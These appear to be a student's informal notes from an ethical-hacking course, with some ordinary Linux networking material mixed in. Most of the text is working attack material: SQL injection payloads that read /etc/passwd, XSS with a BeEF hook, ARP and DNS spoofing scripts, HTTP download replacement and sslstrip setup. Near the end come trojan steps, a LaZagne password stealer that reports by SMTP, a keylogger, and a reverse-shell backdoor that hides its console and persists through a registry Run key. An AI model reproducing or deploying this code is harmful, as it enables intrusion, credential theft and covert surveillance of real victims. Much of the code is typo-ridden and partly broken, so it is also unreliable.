being able to gain access to a system that you are not supposed to have access to   black/white/grey

connecting wireless adapter to kali ->  monitor mode & packet injection required hence built in adapter is not good anyways
settings-ports-usb-enable-+ (listing shows chipset not brandname

ifconfig wlan0 down - ifconfig wlan0 hw ether 00:11:22:33:44:55 - ifconfig wlan0 up - just changing in memory  sometimes networkmanager
might reset 

iwconfig to list only wireless      - currently mode is managed(capture packets destined for itself)  
ifconfig wlan0 down - airmon-ng check kill (will loose internet connection as well) - iwconfig wlan0 mode monitor - ifconfig wlan0 up
(or airmon-ng start wlan0 - to enable monitor mode)


chipset is the brains of adapter that does all the processing & calculations not the brand - atheros AR9271  then alfa & realtek  recommended

sniffing -> airodump-ng <mon_dev>

wifi bands are 2.4 & 5G    (5 GHz monitoring not widely supported)

airodump-ng --band a <mon_dev>  # for 5G

using metaexploitable as target and keeps security low

info gathering -> ip dns technologies used(server,db,language) subdomains other webisites on same domain 

whois.domaintools.com      to get ip and dns and hosting details
toolbar.netcraft.com    to get technologies used
robtex.com       comprehensive dns records

exploit-db  containslist of latest exploits

gaining access to one website is an entry if  multiple websites run on same server

in bing type ip:<ip>  get multiple webs sharing ip

there might be subdomains that are not advertised like for employees

dirb - the tool to get hidden files in the directory when dir eq route (basically bruteforces with list of file names possibly
present in the directory)

xss - injecting js into page  
3 types  1)stored/persistent in db  executes everytime you visit
2)reflected   only while reaching a manipulated url
3)DOM       interpreted and run on client   WS not involved

reflected - he is trying to inject into text box or corresponding url GET    and types  <script>alert("XSS")</script>  then submit
then such an url is sent to the target 

stored/persistent - leverages the comment section and same code but runs on all clients loading the comments section

beef framework to use stored hook XSS      starting beef  and then commenting   <script  src="ip:3000/hook.js"> </script>
target shown as hooked in beef console   along with the multiple options that beef provions to be executed on the hooked

select * from accounts where user='user_name' and password='12345' and 1=1 #'

so basically need to inject whatever is the code needed in 1=1 section   then instead of and using or     only or needs to be true

the key is to break the things with ' or stuff and try and see the error or and & 1=1 1=2 true false statements

or inject in user field itself just - select * from 'admin' #    bypassing the login simply

GET is supposed to be idempotent and not supposed to make any persistent changes unlike POST

whenever you see something like .php & parameters injection possibilities are there in the url 
also can put order by     but while in url # should be replaced by %23   white space is %20  google to get more

getting the shape of table with order by trials and then select * from 'admin' union select 1,2,3,4 # 

but then using 1,user(),database(),version() #

union select 1,table_name,null,null,5 from information_schema.tables     - applies to my sql 
union select 1,column_name,null,null,5 from information_schema.columns wher table_name='accounts'
union select 1,username,password,is_admin,5 from accounts

file inclusion
union select null,load_file('/etc/passwd'),null,null,null 
union select null,'example example',null,null,null into outfile '/var/www/sitename/example.txt'

sqlmap is the tool for automated injection   sqlmap -u <url>

techniques used for prevention - filters,blacklist, whitelist but they can be bypassed but the best way is parametrization

maltego is the tool for info gathering about anything 

#############################################################################################

autoit is the tool he is using to compile the script after changing the extension from txt to au3. script basically downloads 
image + exe both in an array of urls. Goes to icon archive and gets the required icons and imprints that icon on the converted 
exe using autoit. rw-designer is the website he recommends for image to icon conversion. 
Keeps the file in docuroot and using metaexploit waits for incoming connections. then goes to windows and try downloading the 
file. By the time .exe file is executed hook happens.but .exe extension is obvious unless extensions are hidden in windows settings.
hence need to spoof the extension . But he is copying right-to-left character so that gtrexe.jpg  is written as gtrgpj.exe
but browsers remove the right-to-left extension hence he is archiving it before sending. Then while sending email spamming 
senders address as well using data gathered in previous phase. You could use an online site to do the spoofing but since 
they are public they would be already blacklisted and would end up in spam folder. 
beef wil ask for username password at initial login and open up firefox when done. Requires the hook.js be executed. He puts 
hook.js inside index file in docuroot and accesses the apache2 from win machine and it gets displayed in beef online devices.
In beef commands tab is of interest since it allows commands to be executed on remote machine. he is using 'bettercap' to spoof
as well. bettercap helps you downgrade https to http. In commands search for alerts and create alert dialog. Spyder eye gives 
screenshot. Another command is 'redirect' to have them to any other page. prettytheft is for fake logins. fake notification 
to tell corresponding browser to download extension and get reverse shell or backdoor. Again metaexploit is used for the reverse
shell. way to prevent the trojan is to right click properties and see the file type and make sure its jpg and not application exe
In windows ther is a tool called resource manager using that is similar to netstat to get ports and all in networking section.
Hybrid-analysis is one of the sandbox providers where you could test the trojans and analyze what they would do. 

mitm - basically sending a broadcast asking who has IP? and the target responds its MAC. arpspoof -i eth0 -t clientIP gwIP
plus a packet sniffer likecwireshark to analyze the data. But by default,routing is not enabled hence packets will be dropped.
Thus needs to enable port-forwarding.  echo 1 > /proc/sys/net/ipv4/ipforward. Then target will still get internet access. 
Bettercap is advanced than arpspoof. bettercap -iface eth0 then you are inside the tool prompt, typing net.probe on to start 
discovering other nodes in the subnet by sending udp packets. then use net.show to get a list of connected clients in a table.
set arp.spoof.fullduplex true . set arp.spoof.target targetip . then arp.spoof on - to turn on the module. Also ensure that net.probe
&net.recon are running as well. Making use of net.sniff module in bettercap itself to analyse the packets instead of tools 
like wireshark.Generating traffic by reaching http url from win machine. By now it captueres everything including logins. 

Subprocess is used here as well. subprocess.call will wait for the command to be finished before executing any other commands.
ifconfig interface down; ifconfig interface hw ether 00:11:22:33:44:55 ; ifconfig eth0 up 
input vs raw_input in 2. But subprocess module opens up vulnerability if input is not properly validated. For eg, In linux terminal 
; is used to separate commands just like SQL injection. Instead he suggests using the second method where each argument sepatrated 
by space is an element of a list ie ls -lrt is ['ls','-lrt']. Thats why they wont recommend shell=True. 
The whole --help and arguments and all can be taken care using optparse.

import optparse
parser = optparse.OptionParser()
parser.add_option("-i","--interface",dest="interface",help="Interface to change MAC") # similarly other arguments below
(options, arguments) = parser.parse_args()
print('The interface is '+options.interface)

Pastes the output in pythex an online site showing regex matches. Pasted the ifconfig output there as well. \w\w:\w\w:\w\w:\w\w:\w\w:\w\w  to match mac
ifcfg_res = subprocess.check_output('ifcfg') is cleaner.  mac_out = re.search(pattern,ifcfg_res)  then mac_out.group[0].

https = http + ssl/tls   -> basically encrypting the text . So MITM can read the data. tls/ssl is very difficult to break.
So technique is to downgrade to http. bettercap has a caplet to remove https. the advanced tool is ssl strip. pastes the downloaded
caplet to  /usr/share/bettercap/caplets/ (original.zip). within bettercap prompt, caplets.show() will list all the caplets.
just need to type hstshijack/hstshijack . then target tries to reach linkedin its going via http. but fb, twitter etc are using 
hsts which is harder to bypass. Incase of hsts, browser comes preloaded with a number of websites which can be loaded only in 
https. facebook.corn or twiter.com . change them in caplet file settings. Works only when user goes via search engine ie if he types 
in url it wont work since browser will only accept secure connection for listed websites. 
dns spoofing - redirecing from specific web to ours - again using bettercap since this is also mitm - set dns.spoof.all true
set dns.spoof.domains *.zsecurity.org   then  dns.spoof on . again this wont work against https. Or you can inject js in response 
from genuine site. creates a simple alert.js    put it in the bettercap hsts config file as before as*:/root/alert.js

tcpdump can show the whole sysn , syn+ack , ack , data , ack structure. From Gordon classes. And individual packet components
like full frame, IP , TCP ,data etc. ethtool can show device info like max transmission rate. 

        Supported link modes:   10baseT/Half 10baseT/Full     #10mbps
                                100baseT/Half 100baseT/Full    #100Mbps
                                1000baseT/Half 1000baseT/Full   #1gops
        Supported pause frame use: No
        Supports auto-negotiation: Yes    # it advertises & negotiates with other end and settles on the lower transmission rate of the two
        Advertised link modes:  10baseT/Half 10baseT/Full 
                                100baseT/Half 100baseT/Full 
                                1000baseT/Full 
        Advertised pause frame use: Symmetric Receive-only
        Advertised auto-negotiation: Yes
        Speed: 10Mb/s    ##### this shows the currently in use 
        Link detected: no     ### currently not connected or not able to detect connection ie the other end !!!
        
 
 
     inet 192.168.0.106/24 brd 192.168.0.255 scope global dynamic wlp1s0
       valid_lft 6763sec preferred_lft 6763sec
    inet6 fe80::ee3c:d655:269:ff6b/64 scope link tentative dadfailed     # scope link means local while global is internet 
       valid_lft forever preferred_lft forever
    inet6 fe80::890e:f539:da74:bcdc/64 scope link tentative dadfailed 
       valid_lft forever preferred_lft forever

Look for errors drop retransmissions. Too many errors indicate hardware failure. 
ethtool -S wlp1s0       # -S for statistics
NIC statistics:
     rx_packets: 513636
     rx_bytes: 612302518
     rx_duplicates: 272
     rx_fragments: 621047
     rx_dropped: 297
     tx_packets: 279918
     tx_bytes: 181796002
     tx_filtered: 0
     tx_retry_failed: 2
     tx_retries: 5487
     sta_state: 4
     txrate: 150000000
     rxrate: 108000000
     signal: 216
     channel: 0
     noise: 18446744073709551615
     ch_time: 18446744073709551615
     ch_time_busy: 18446744073709551615
     ch_time_ext_busy: 18446744073709551615
     ch_time_rx: 18446744073709551615
     ch_time_tx: 18446744073709551615

Or you can set new parameters with -s --> ethtool -s eth0 speed 100 duplex full

llly netstat -s shows network statistics as well. 

tcp/udp  -> active is when we initiate connection while passive is when someone connects to us. 



A friendly reminder: since Linux kernel 2.6.24 using /proc to store ACPI info has been discouraged and deprecated.

Now we are encouraged to use -> /sys/class/power_supply/BAT0.

UPDATE: Linux 3.19 and onwards, we should look at the following directory -> /sys/class/power_supply/BAT1/

For example checking capacity & status on Arch Linux running Linux 4.20 ->

# uname -a
Linux netbook 4.20.1-arch1-1-ARCH #1 SMP PREEMPT Wed Jan 9 20:25:43 UTC 2019 x86_64 GNU/Linux
# cat /sys/class/power_supply/BAT1/capacity
99
# cat /sys/class/power_supply/BAT1/status
Charging

gordon downloads a page using wget and then runs netstat and show that connection goes to TIME_WAIT state ie wget uses http and http 
uses tcp as the transport protocol. TIME_WAIT means waiting for connection to fully close. /etc/service & /etc/protocols (show protocol numbers) 
Lynx closed and deleted the connection straight away but wget keeps it for a while in TIME_WAIT. port is a 16-bit number upto 16k.

nc accepts only single connection. as soon as the client connected, it went from LISTEN to ESTABLISHED. There is no more LISTENs.
But real servers creates child process(clone of itself) to deal with connection and keeps listening for newer connections.

netdiscover -r 192.168.1.1/24

import scapy.all as scapy
def scan(ip):
        #arping(ip) - it does what is required but going to implement the same manually to have a deeper understanding 
        arp_request = scapy.ARP(pdst=ip)
        print(arp_request.summary())  # prints ARP who has ip <ip> says <own_ip>
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        print(broadcast.summary())   # <own_mac> -> ff:ff:ff:ff:ff:ff
        arp_request_broadcast = broadcast/arp_request
        print(arp_request_broadcast.summary())   # Ether / ARP who has IP <ip> says <own_ip>
        #instead of summary .show() can be called and it will show individual values of packets
        answered, unanswered = scapy.srp(arp_request_broadcast, timeout = 1) #list of ans & unans packets  srp for send n recv packets
        #keep verbose=False if you dont want clutter
        print(answered.summary())  # ARP who has ip <ip> says <own_ip> > othernodes respond with <their_mac> at <their_ip>
        print(unanswered.summary())  # ARP who has ip <ip> says <own_ip> > response is none ie aprt from available nodes 
        
        for i in answered:
                print(i[1].psrc + '\t\t' + i[1].hwsrc)
                
        #For the sake of datastructures
        map_ip_dict_list = []
        for i in answered:
                print(i[1].psrc + '\t\t' + i[1].hwsrc)
                map_ip_dict = {'mac':i[1].hwsrc, 'ip':i[1].psrc}
                map_ip_dict_list.append(map_ip_dict)
        
                
scan('192.168.0.1/24')

the function does one thing and one thing alone well. Good for reusability and modularity.

###################################################################################################
#!/usr/bin/env python
import scapy.all as scapy
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP / IP range.")
    options, arguments = parser.parse_args()
    return options

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    return clients_list

def print_result(results_list):
    print("IP\t\t\tMAC Address\n-------------------------------------")
    for client in results_list:
        print(client["ip"] + "\t\t" + client["mac"])


options = get_arguments()
scan_result = scan(options.target)
print_result(scan_result)

#########################################################################################################
optparse is deprecated argparse is the replacement. 
arp spoofing
for dynamic print in python3, print('\r',end='')
packet = scapy.ARP(op=2,pdst=<>,psrc=<>,hwsrc=<>,hwdst<>)  # scapy will automatically assign hwsrc as the interface macc by default
scapy.send(packet)    #op=2 is important since its a response not a request ,ARP does not care for either

packet.show() & summary() still works 

try:

except KeyboardInterrupt:
        print('CTRLC received .. restoring MACs)
        
Spoofing has to be done continuoulsy with a time.sleep(2) in a while because the target will revert to original Gateway otherwise.

Packet sniffing- because we have no way to read the data as of now.
scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #prn is call back function ie call the function given everytime its invoked
#sore is false since we dont want to save it in mem and create memory pressure
def process_sniffed_packet(packet):
        print(packet)
but data like this will look gibberish. hence we need to filter the data.in scapy.sniff add an additional argument called filter
ie filter='udp|tcp|arp|port 21|port 80' #use the bpf syntax but it doesnt allow filtering of third party modules.
For http filtering we need a third party modulee- scapy_http
if packet.haslayer(http.HTTPRequest):
        print(packet)              # because stuff related to web are in http ie the interesting stuff
        
packet.show()   - so that we know which layer is required.it shows ethernet layer, Ip, Tcp and Http layer.
we can see method=POST for forms. 
if packet.haslayer(scapy.Raw):
        print(packet[scapy.Raw].load])
  
 url =  Packet([http.HTTPRequest].Host)+Packet([http.HTTPRequest].Path)   # for all the urls
 
Intercepting and modifying packet - We can modify the packet and send to dest but the unmodified packet will reach the destination
first most probably and get executed anyway. and modified packet might be rejected. Better to create a queue and access the queue
and modify and send the request. Target receives only modified request or response only. Need to make use of iptables and modify 
routing rules-> iptables -I FORWARD -j NFQUEUE --queueuno 0 . This be done with subprocess itself. Now every packets will be trapped in queueu.
pip install netfilterqueue. 
queueu = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  #again process_packet is the call back function that will be executed on every packet that gets trapped.
queue.run()

def process_packet(packet):
        print(packet)  #but when target tries to access web, packets get trapped in queue and he doesnt get to the internet.
        packet.accpet()  #now he can reach internet even though packets are being accessed
        # packet.drop()  # packets will be dropped ie no internet
  
  iptables --flush   - to delete entries
  
FORWARD chain is when they come from different system while OUTPUT chain is for packet leaving the same computer while INPUT is for incoming packets.
since we are testing on our local computer
iptables -I OUTPUT -j NFQUEUE --queueuno 0
iptables -I INPUT -j NFQUEUE --queueuno 0

To manipulate need to convert the netfilter packet to a scapy packet, scapy_packet = scapy.IP(packet.get_payload())
print(scapy_packet) - will show packets by all the layers. Forget not to remove iptables rules. 
google.com  A   8.8.8.8   -Obvioulsy dns spoofing is changing the targets desired IP to an IP of your choosing.
if scapy_packet.haslayer(scapy.DNSRR):
        print(scapy_packet.show())

in the respose rdata shows the ip. Fields can be obtained directly like this qname=scapy_packet[scapy.DNSQR].qname.
if 'iie' in qname:
        answer = scapy.DNSRR(rrname=qname, rdata='192.168.1.105
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1  #since by default there was 4 answers but we are editting and giving only 1
        #length & checksum be removed from actual packet to avoid corruption.scapy will recalculate.
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum       
        #now need to modify the actual packet since we were playing around with scapy packet
        packet.set_payload(str(scapy_packet))
        

now the modification will be done in http layer instead of dns. In scapy data in http are placed in raw layer.Distinguishing req & response by
seeing whether http is in sport or dport. Netfilter and scapy are used as in the previous case except inside the function.
ack_list = []
if scapy_packet.haslayer(scapy.Raw
        if scapy_packet[scapy.TCP].dport == 80:
                if '.exe' in scapy_packet[scapy.Raw].load: #this is what is needed to be replaced
                        #but not as easy as replacing the url to the file since tcp handshakes are required. There might be multiple requests
                        happening at the backend for a single click. Need to confirm the response for the req ie the ack of the request will be same as 
                        seq of the response.
                        ack_list.append(scapy_packet[scapy.Tcp].ack)
                        
         if scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.Tcp].seq in ack_list:
                        ack_list.remove(scapy_packet[scapy.Tcp].seq)  # need to remove it from list since we already act on it
                        print('replacing the file')
                        #need to put the code for replacement in here
                        # use 301 http response to indicate the site has moved permanently
                        scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved permanently\nLocation: http://<exes url>\n\n'
                        del scapy_packet[scapy.IP].len
                        del scapy_packet[scapy.IP].chksum
                        del scapy_packet[scapy.TCP].len
                        packet.set_payload(str(scapy_packet))
                        
Now modifying data sent in raw layer like html page itself.For eg injecting js in target website. In load section we can see accept encoding
gzip and deflate. Thats basically the reaason we see html in kind of a gibberish form. server sends in gzipped form and browser 
gunzips it. hence if remove accept encoding, no longer it will come encoded. need to replace text with regex.
modified_load = re.sub('Accept-encoding.*?\\n\\r','',scapy_packet[scapy.Raw].load) # ? is for non-greedy match ie it will stop at first match of \r\n
</body> is a good anchor to put js since we put it at the end.so that it wont affect load time or not cause issuues if js has errors.
now in the repose section, modified_load = scapy_packet[scapy.Raw].load.replace('</body>','<script>alert(test);</script></body>')

certain webservers set a field called content length making it impossible to inject code since it would change content length. 
content_len_search = re.search('Content-length\s\d*',load)
if content_len_search:
        content_len = content_len_search.groups(0)
        new_content_len = int(content_len) + len('<script>alert(test);</script>')
        load = load.replace(content_len,str(new_content_len))
        
  
  #need to use non-capturing group to get only digits in content length ie '(?:Content-length\s)(\d*)'  --> (?:) - non-capturing ie just for matching not printed
  now use group(1) since 0 will return everyting thats matched. now bring in beef. hook.js be injected as above.Replacing the script 
  part with hook script. iptables + arpspoof for mitm ate always the first steps.
  
  https - cant modify or inject because data will look gibberish. came up with sslstrip. basically it will strip the https on the 
  first response from the server hence by the time response reaches client its http and target client never knows the communication
  could be upgraded to https. again when the clint makes the request sslstrip will upgrade it to https so the webserver eg bbc 
  will never get to know the actual client is using http.sslstrip is also written in python. 
  just typing sslstip is enough to get it running. runs on port 10000. need to redirect all the packets to 10k from 80. 
  iptables -t NAT -A PREROUTING -p TCP --destination-port 80 -j REDIERECT --to-port 10000
  since sslstrip and previous scripts are modifying packets there are conficts. ie now the dport and source ports are 1000 instead 
  of 80. also ip tables rules are for input and output since packets are already inside the host ie after sslstrip. 
  need to use packet.show() to troubleshoot in case somethings breaks. but it might end up using HTTP1.1 which sends data in chunks
  and the content length part wont execute as expected. so send the request in HTTP1.0, in req section load = load.replace('HTTP/1.1','HTTP/1.0')
  
Malware- trojans are evil programs that look like regular programs like pdf or jpeg - sunprocess.Poen does not wait for command to finish.
command = 'msg * you have been tracked'. As of now keeping .py extension and running with interpreter ie packaging has to be done.
netsh wlan show profile <wifiname> key=clear . 
server = smtp.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email,password)
server.sendmail(email,email,message)
server.quit()

grep is implemented with command output in a variable and then regex and non-capturing groups and pythex. need to use findall instead
of search.
need to combine download and execute and report using smtp in single file. requests into the picture. file_name = url.split('/')[-1].
lazagne has been forked which helps getting stored passwords.use the 32bit if unsure about arch. lazagne --help. usually just the module name.
lazagne.exe browser. or if given all as arg it will try to show all passwords it can get. but the output is hown on terminal 
so reporting is required. lazagne.exe is kept in ur server not like downloading and unzipping from github. result of the command
ouput is captured in variable using subproccess and its sent via smtp. but the downloaded file will be visible to the user hence
need to interact with os. import os because its platform independent.os.remove('lazagne.exe'). but during the execution time 
file will be visible say 5 to 60s. so let the file be downloaded at a location user might not be looking at say tmp. but temp 
location varies per os hence import tempfile. temp_dir = tempfile.gettempdir(). os.chdir(temp_dir) before execution. 
 
 keylogger - library is pynput - monitor and control mouse and keyboard.  import pynput.keyboard (only for keyboard)
 keyboard_listener = pynput.keyboard.Listener(on_press = proccess_key_press)
 log = ''
 def proccess_key_press(key):
        global log
        try:
                log = log + str(key.char)  # converting key to corresponding char only else it will come with u'
        except AttributeError:
                log = log + ' ' + str(key) + ' '   #exception will occur for special chars like space,enter,tab,up,down etc
        print(log)
 with keyboard_listener:
        keyboard_listener.join()
        
 use of global variable is not rcd as it gets difficult to track where and by which functions its being modified and it leads 
 to difficulties in troubleshooting. But inside our call back function its useful since everytime key is pressed the function
 will be run resetting local variables. 
        
 The function will keep executing until mnually interrupted hence we cant implement a sendmail function that would run after the 
 functio hence multithreading is required here. import threading
 def report():
        global log
        print(log)
        log = ''
        timer = threading.Timer(5, report)  # recursive 
        timer.start()
        
 so report is called before listener and since its multithreaded our main function will run infintely and report periodically.
as a convention first letter is capitalized for a class name. function inside a class is a method since its invoked via class object.
but every method inside the class will have self as the first argument. Now everything is inside class and methods.
directly creating an object and executing at the eof is not rcd. need to create a separate file and import classes and methods 
there. 
import keylogger
my_keylogger = keylogger.Keylogger()    
my_keylogger.start()   #method is lower while class name starts with uppercase as convention
now the user doesnt need to have any idea about the implementation. implement classes for packaging and to provide abstraction.
programmer can start using and developing from this abstracted level ie no need to look into the implementation of each and everything.
__init__(self) gets invoked upon object creation itself no need of explicit call.
when we initialize self.global inside __init__  global log is no longer reqiured. 
##Note that the point of classes is to eliminate (truly) global state and to manage it within classes and objects
in sendmail its a good idea to add \n\n before message because sometimes it might all go in subject line without body.

backdoor- opening ports at target and awaiting connections will generate firewall alarms in targets system in general hence not rcs.
unknown port open by unknown program - hence making use of reverse connection. opens up a port in hackers computer and awaits 
connection from victim. firewall mostly concerned about incoming traffic. but ofcourse in our setup it doesnt allow outgoing 
connections to unknown ips and ports. nc is used for a start. sublime doesnt have as many features as pycharm. 

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('hip',4444)) #argument is reqd in tuple hence 2 braces
connection.send('Connected from wind')  #.encode('utf-8') was required since it kept asking for byte or just encode()
recvd_data = connection.recv(1024) #1024 is buffer size
cmd_out = subprocess.check_output(recvd_data)
connection.send(cmd_out)
connection.close()
waiting on 4444 in his computer with listening nc. but better to implement a server at hend because we can implement download
and upload functionalites etc. 
listener = connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #to reuse address incase connections get dropped
listener.bind(('hip',4444))   #instead of connecting to a server we just bind to a port
listener.listen(0)   #backlog is the number of connections that can be queued
print('Awaiting incoming connection')
connection, address = listener.accept()  #connection is an object which we can use to send and recv data as before
print('Connection established from '+str(address))
while True:
        cmd = input('->')
        connection.send(cmd)
        res = connection.recv(1024)
        print(res)
        
 upto listen its rcd to put in __init__ only connection object needs self appended infront of it since its accessed later 
 outside the function in the same class. OOPs allows easy extendability. serialization issue with tcp. we have set a size 1024 bytes
 server doesnt have a way of knowing start and end of stream in the tcp data pipeline. tcp is streambased not msg based. data mixup
 will happen within the stream. trying to read a large text file  every enter will print buffersize(1024bytes) of lines eventually connection 
 gets broken. this will definitely create issue with upload n download. various methods as optio ie
 1)calculate the size of the message before sending and append it as a header for the msg so that server can iterate till that 
 size is reached
 2)add a special end of message string at end of every msg
 3)making use of serialization - putting data into a box and sending the box as a whole so that it may b packed at server.
 data may b text string , list, map. json is a general way of serializaing data structure. 
 def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(data)
        
  def reliable_recv(self):
       data = self.connection.recv(1024) # but got the same problem since if data stream is longer than 1024 it will throw value error
       return json.loads(data) #above maentioned exception likely to be invoked here
       
  Need to improvise t collect json>1024 bytes
         def reliable_recv(self):
                data = ''
                while True:
                        try:
                                data = data + self.connection.recv(1024) 
                                return json.loads(data)
                        except valueError:
                                continue

Right now exit portion has to be implemented in both server and backdoor since we need it to exit without throwing those python 
errors ie exit both the programs upon sending exit. 
command = command.split(' ')
if command[0] == 'exit':
        self.connection.close()
        exit()  #exit the python program as well
        
uploading n downloading file - simply copying the contents in an empty file

def read_file(self, path):
        with open(path, 'rb') as f:
                return f.read()
if command[0] == 'download':                
        command_out = read_file(command[1])
        self.reliable_send(command_out)
        
 now the same file needs to be captured in server.
 if content[0] == 'download':
        self.write_file(result)
        
  def write_file(self, path, content):
        with open(path) as f:
                f.write(content)
                return 'file download complete'
                
   but this will throw error for image files because of encoding. hence use base 64 encoding and decoding.
   return base64.b64encode(command_out)  #the fn will convert unknown characters if any in the file. same be decoded at server end.
   
   next need to implement upload file, just opposite to download at both ends. if the program crashes, connection will be lost. Hence 
   exception handling is most important to keep connections alive. hence try except is required. 
   except Exception:  # so that connection wont be lost
        print('Errors have occured')
       
  
in windows - pip install pyinstaller
the binary will run irrespective of whether or not python is installed. but the commandline will remain open in targets computer
until connection is closed. use sys.exit() while exiting else target will see error related to keyboard interrupt.
pyinstaller.exe pgm.py --onefile --noconsole    #last argument to avoid cmdline popping up at target during run time.
but functions like check_output makes use of terminals for output. in arguments, give stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
it doesnt show up on taskbar as well.   
need to download and install windows python intrepreter on linux using wine. wine msiexec /i nameoffile.msi
creates .wine folder in home directory and drive-c will be created within that for installation. once installaion is complete
wine python.exe -m pip install pyinstaller  -> from the installed directory. 
but if any additional package is used which doesnt come by default in the hackers computer, that needs to be packaged as well.
install it in the wine based windows python intrepreter as well before packaging. 
dependency packaging is taken care by pyinstaller ie if we have a file like a module with classes and another file where
we instantiate the object of the class and call it, just mention the second file where the actual execution call happens.
dependent imports will be taken care by pyinstaller. 
persistence - program automatically executes on reboot. ie need to edit registry values using regedit. hkey_current_user>software>
microsoft>windows>current_version>run (will show the entries at startup)
reg add /?  -- for help
reg add HKCU\software\microsoft\windows\current_version\run \v test \t REG_SZ /d "C:\test.exe"
using subprocess call to execute the above command. but backdoor will try and execute everytime system reboots and tries to connect
with attacker but will throw error if server is non-reachable hence try in the code block to sys.exit() in case connection 
unable to be established. 
evil_file_loaction = os.environ['AppData'] + '\\Windows Explorer.exe'
if not os.path.exists(evil_file_loaction):
        shutil.copyfile(sys.executable,evil_file_loaction)    # __file__ as source if we were using the .py file itself instead of to be packaged exe
        subprocess.call()  # put the reg add command with evil_file_location



   
        
       
 
 
        








                        
                        
        


        
        

 



  

        

        
        
 







 





















 









